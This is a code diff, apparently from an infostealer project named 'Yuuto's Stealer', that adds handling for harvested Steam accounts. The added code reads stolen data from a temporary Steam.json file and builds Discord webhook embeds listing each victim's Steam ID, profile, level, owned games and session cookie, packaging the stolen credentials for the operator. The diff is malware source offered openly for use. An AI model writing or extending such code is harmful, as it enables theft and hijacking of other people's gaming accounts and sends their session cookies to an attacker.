@@ -222,6 +222,48 @@ const json = async (zipFile) => {
     });
   }
 
+  if (fs.existsSync(join(tempFolder, 'Steam.json'))) {
+    const accounts = JSON.parse(fs.readFileSync(join(tempFolder, 'Steam.json'), 'utf8'));
+
+    accounts.forEach(({ cookie, accountId, accountInfo, games, level }) => {
+      const gamesListUrl = `${accountInfo.players[0].profileurl}games/?tab=all`;
+      const gamesListMd = `[Click here for the full list](${gamesListUrl})\n`;
+      const gamesList = (games) => {
+        const filters = {
+          link: game => `[${game.name}](https://store.steampowered.com/app/${game.appid})`,
+          text: game => game.name
+        };
+        const length = (filter) => games.map(filters[filter]).join(', ').length;
+        const maxLength = 1024 - gamesListMd.length;
+
+        if (length('link') > maxLength && length('text') > maxLength) {
+          return `Too many games to show here, or private. Full list: ${gamesListUrl}`;
+        } else if (length('link') < maxLength) {
+          return gamesListMd + games.map(filters.link).join(', ');
+        } else if (length('link') > maxLength && length('text') < maxLength) {
+          return gamesListMd + games.map(filters.text).join(', ');
+        }
+      };
+      embeds.push({
+        author: {
+          name: accountInfo.players[0].personaname,
+          icon_url: accountInfo.players[0].avatar,
+          url: accountInfo.players[0].profileurl
+        },
+        fields: [
+          ['🆔 Steam ID', code(accountId)],
+          ['➕ Account Created', `<t:${accountInfo.players[0].timecreated}>` || 'Unknown'],
+          ['🪙 Level', level.player_level.toString() || 'Private'],
+          ['🍪 Cookie', cookie],
+          [`🎮 Games Owned (${games.game_count})`, gamesList(games.games), false]
+        ].map(fieldsMap),
+        thumbnail: {
+          url: accountInfo.players[0].avatarfull
+        }
+      });
+    });
+  }
+
   return {
     content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
     username: 'Yuuto\'s Stealer | https://github.com/JustYuuto/Yuuto-Stealer',
